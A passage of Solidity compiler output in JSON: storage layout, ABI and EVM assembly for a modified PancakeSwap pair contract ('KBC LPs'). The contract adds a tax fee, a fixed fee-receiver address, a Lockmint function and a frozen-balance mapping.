								"offset": 0,
								"slot": "3",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 35,
								"contract": "src/exchange-protocol/contracts/PancakeERC20.sol:PancakeERC20",
								"label": "DOMAIN_SEPARATOR",
								"offset": 0,
								"slot": "4",
								"type": "t_bytes32"
							},
							{
								"astId": 42,
								"contract": "src/exchange-protocol/contracts/PancakeERC20.sol:PancakeERC20",
								"label": "nonces",
								"offset": 0,
								"slot": "5",
								"type": "t_mapping(t_address,t_uint256)"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_bytes32": {
								"encoding": "inplace",
								"label": "bytes32",
								"numberOfBytes": "32"
							},
							"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => mapping(address => uint256))",
								"numberOfBytes": "32",
								"value": "t_mapping(t_address,t_uint256)"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/exchange-protocol/contracts/PancakePair.sol": {
				"PancakePair": {
					"abi": [
						{
							"inputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0In",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1In",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0Out",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1Out",
									"type": "uint256"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Swap",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint112",
									"name": "reserve0",
									"type": "uint112"
								},
								{
									"indexed": false,
									"internalType": "uint112",
									"name": "reserve1",
									"type": "uint112"
								}
							],
							"name": "Sync",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "DOMAIN_SEPARATOR",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "FeeResiver",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Lockmint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "liquidity",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "MINIMUM_LIQUIDITY",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "PERMIT_TYPEHASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "_frozenBalance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "getReserves",
							"outputs": [
								{
									"internalType": "uint112",
									"name": "_reserve0",
									"type": "uint112"
								},
								{
									"internalType": "uint112",
									"name": "_reserve1",
									"type": "uint112"
								},
								{
									"internalType": "uint32",
									"name": "_blockTimestampLast",
									"type": "uint32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "_token0",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "_token1",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "_taxfee",
									"type": "uint256"
								}
							],
							"name": "initialize",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "kLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "liquidity",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "nonces",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "deadline",
									"type": "uint256"
								},
								{
									"internalType": "uint8",
									"name": "v",
									"type": "uint8"
								},
								{
									"internalType": "bytes32",
									"name": "r",
									"type": "bytes32"
								},
								{
									"internalType": "bytes32",
									"name": "s",
									"type": "bytes32"
								}
							],
							"name": "permit",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "price0CumulativeLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "price1CumulativeLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "skim",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "amount0Out",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1Out",
									"type": "uint256"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "sync",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "taxfee",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"src/exchange-protocol/contracts/PancakePair.sol\":318:18511  contract PancakePair is IPancakePair, PancakeERC20 {... */\n  mstore(0x40, 0x80)\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":438:508  address public FeeResiver = 0x358bB1515A41a803aD950D3A0d22B914093DdB80 */\n  0x06\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":466:508  0x358bB1515A41a803aD950D3A0d22B914093DdB80 */\n  0x358bb1515a41a803ad950d3a0d22b914093ddb80\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":438:508  address public FeeResiver = 0x358bB1515A41a803aD950D3A0d22B914093DdB80 */\n  or\n  swap1\n  sstore\n  0x01\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":1227:1252  uint private unlocked = 1 */\n  0x0f\n  sstore\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":2471:2529  constructor() public {... */\n  callvalue\n    /* \"--CODEGEN--\":5:7   */\n  dup1\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n  pop\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1245:1378  keccak256(... */\n  mload(0x40)\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1149:1156  chainid */\n  chainid\n  swap1\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1245:1378  keccak256(... */\n  dup1\n  0x52\n  data_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f\n  dup3\n  codecopy\n  0x40\n  dup1\n  mload\n  swap2\n  dup3\n  swap1\n  sub\n  0x52\n  add\n  dup3\n  keccak256\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1412:1416  name */\n  dup3\n  dup3\n  add\n  dup3\n  mstore\n  0x07\n  dup1\n  dup5\n  mstore\n  shl(0xc8, 0x4b4243204c5073)\n  0x20\n  swap5\n  dup6\n  add\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1446:1456  bytes(\"1\") */\n  dup3\n  mload\n  dup1\n  dup5\n  add\n  dup5\n  mstore\n  0x01\n  dup2\n  mstore\n  shl(0xf8, 0x31)\n  swap1\n  dup6\n  add\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  dup3\n  mload\n  dup1\n  dup6\n  add\n  swap3\n  swap1\n  swap3\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1396:1418  keccak256(bytes(name)) */\n  0x6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  dup3\n  dup5\n  add\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1436:1457  keccak256(bytes(\"1\")) */\n  0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  0x60\n  dup4\n  add\n  mstore\n  0x80\n  dup3\n  add\n  swap6\n  swap1\n  swap6\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1508:1512  this */\n  address\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  0xa0\n  dup1\n  dup4\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n  dup3\n  mload\n    /* \"--CODEGEN--\":26:47   */\n  dup1\n  dup4\n  sub\n    /* \"--CODEGEN--\":22:54   */\n  swap1\n  swap2\n  add\n    /* \"--CODEGEN--\":6:55   */\n  dup2\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  0xc0\n  swap1\n  swap2\n  add\n  swap1\n  swap2\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1194:1537  keccak256(... */\n  dup1\n  mload\n  swap2\n  add\n  keccak256\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1175:1191  DOMAIN_SEPARATOR */\n  0x04\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1175:1537  DOMAIN_SEPARATOR = keccak256(... */\n  sstore\n  pop\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":2502:2522  factory = msg.sender */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":2512:2522  msg.sender */\n  caller\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":2502:2522  factory = msg.sender */\n  or\n  swap1\n  sstore\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":318:18511  contract PancakePair is IPancakePair, PancakeERC20 {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f 454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429\n\nsub_0: assembly {\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":318:18511  contract PancakePair is IPancakePair, PancakeERC20 {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":318:18511  contract PancakePair is IPancakePair, PancakeERC20 {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x70a08231\n      gt\n      tag_34\n      jumpi\n      dup1\n      0xbc25cf77\n      gt\n      tag_35\n      jumpi\n      dup1\n      0xdcbbb373\n      gt\n      tag_36\n      jumpi\n      dup1\n      0xdcbbb373\n      eq\n      tag_30\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_31\n      jumpi\n      dup1\n      0xf317739c\n      eq\n      tag_32\n      jumpi\n      dup1\n      0xfff6cae9\n      eq\n      tag_33\n      jumpi\n      jump(tag_2)\n    tag_36:\n      dup1\n      0xbc25cf77\n      eq\n      tag_26\n      jumpi\n      dup1\n      0xc45a0155\n      eq\n      tag_27\n      jumpi\n      dup1\n      0xd21220a7\n      eq\n      tag_28\n      jumpi\n      dup1\n      0xd505accf\n      eq\n      tag_29\n      jumpi\n      jump(tag_2)\n    tag_35:\n      dup1\n      0x900820d8\n      gt\n      tag_37\n      jumpi\n      dup1\n      0x900820d8\n      eq\n      tag_22\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_23\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_24\n      jumpi\n      dup1\n      0xba9a7a56\n      eq\n      tag_25\n      jumpi\n      jump(tag_2)\n    tag_37:\n      dup1\n      0x70a08231\n      eq\n      tag_18\n      jumpi\n      dup1\n      0x7464fc3d\n      eq\n      tag_19\n      jumpi\n      dup1\n      0x7ecebe00\n      eq\n      tag_20\n      jumpi\n      dup1\n      0x89afcb44\n      eq\n      tag_21\n      jumpi\n      jump(tag_2)\n    tag_34:\n      dup1\n      0x23b872dd\n      gt\n      tag_38\n      jumpi\n      dup1\n      0x47d5d856\n      gt\n      tag_39\n      jumpi\n      dup1\n      0x47d5d856\n      eq\n      tag_14\n      jumpi\n      dup1\n      0x5909c0d5\n      eq\n      tag_15\n      jumpi\n      dup1\n      0x5a3d5493\n      eq\n      tag_16\n      jumpi\n      dup1\n      0x6a627842\n      eq\n      tag_17\n      jumpi\n      jump(tag_2)\n    tag_39:\n      dup1\n      0x23b872dd\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x30adf81f\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_12\n      jumpi\n      dup1\n      0x3644e515\n      eq\n      tag_13\n      jumpi\n      jump(tag_2)\n    tag_38:\n      dup1\n      0x095ea7b3\n      gt\n      tag_40\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x0dfe1681\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x1794bb3c\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_40:\n      dup1\n      0x022c0d9f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x06fdde03\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x0902f1ac\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n    tag_3:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0x80\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_42\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_42:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n      dup2\n      calldataload\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n      0x40\n      dup4\n      add\n      calldataload\n      and\n      swap2\n      swap1\n      dup2\n      add\n      swap1\n      0x80\n      dup2\n      add\n      0x60\n      dup3\n      add\n      calldataload\n        /* \"--CODEGEN--\":21:32   */\n      0x0100000000\n        /* \"--CODEGEN--\":5:33   */\n      dup2\n      gt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_43\n      jumpi\n        /* \"--CODEGEN--\":46:47   */\n      0x00\n        /* \"--CODEGEN--\":43:44   */\n      dup1\n        /* \"--CODEGEN--\":36:48   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_43:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n      dup3\n      add\n        /* \"--CODEGEN--\":35:44   */\n      dup4\n        /* \"--CODEGEN--\":28:32   */\n      0x20\n        /* \"--CODEGEN--\":12:26   */\n      dup3\n        /* \"--CODEGEN--\":8:33   */\n      add\n        /* \"--CODEGEN--\":5:45   */\n      gt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":58:59   */\n      0x00\n        /* \"--CODEGEN--\":55:56   */\n      dup1\n        /* \"--CODEGEN--\":48:60   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_44:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap2\n        /* \"--CODEGEN--\":100:109   */\n      dup5\n        /* \"--CODEGEN--\":95:96   */\n      0x01\n        /* \"--CODEGEN--\":81:93   */\n      dup4\n        /* \"--CODEGEN--\":77:97   */\n      mul\n        /* \"--CODEGEN--\":67:75   */\n      dup5\n        /* \"--CODEGEN--\":63:98   */\n      add\n        /* \"--CODEGEN--\":60:110   */\n      gt\n        /* \"--CODEGEN--\":39:50   */\n      0x0100000000\n        /* \"--CODEGEN--\":25:37   */\n      dup4\n        /* \"--CODEGEN--\":22:51   */\n      gt\n        /* \"--CODEGEN--\":11:118   */\n      or\n        /* \"--CODEGEN--\":8:10   */\n      iszero\n      tag_45\n      jumpi\n        /* \"--CODEGEN--\":131:132   */\n      0x00\n        /* \"--CODEGEN--\":128:129   */\n      dup1\n        /* \"--CODEGEN--\":121:133   */\n      revert\n        /* \"--CODEGEN--\":8:10   */\n    tag_45:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n      swap1\n      swap3\n      pop\n      swap1\n      pop\n      tag_46\n      jump\t// in\n    tag_41:\n      stop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":217:256  string public constant name = \"KBC LPs\" */\n    tag_4:\n      tag_47\n      tag_48\n      jump\t// in\n    tag_47:\n      0x40\n      dup1\n      mload\n      0x20\n      dup1\n      dup3\n      mstore\n      dup4\n      mload\n      dup2\n      dup4\n      add\n      mstore\n      dup4\n      mload\n      swap2\n      swap3\n      dup4\n      swap3\n      swap1\n      dup4\n      add\n      swap2\n      dup6\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_49:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_51\n      jumpi\n        /* \"--CODEGEN--\":90:101   */\n      dup2\n      dup2\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":71:82   */\n      dup4\n      dup3\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_49)\n    tag_51:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":217:256  string public constant name = \"KBC LPs\" */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_52\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_52:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1393:1694  function getReserves()... */\n    tag_5:\n      tag_53\n      tag_54\n      jump\t// in\n    tag_53:\n      0x40\n      dup1\n      mload\n      sub(shl(0x70, 0x01), 0x01)\n      swap5\n      dup6\n      and\n      dup2\n      mstore\n      swap3\n      swap1\n      swap4\n      and\n      0x20\n      dup4\n      add\n      mstore\n      0xffffffff\n      and\n      dup2\n      dup4\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x60\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_6:\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_56\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_56:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_57\n      jump\t// in\n    tag_55:\n      0x40\n      dup1\n      mload\n      swap2\n      iszero\n      iszero\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":700:721  address public token0 */\n    tag_7:\n      tag_58\n      tag_59\n      jump\t// in\n    tag_58:\n      0x40\n      dup1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2591:2865  function initialize(... */\n    tag_8:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      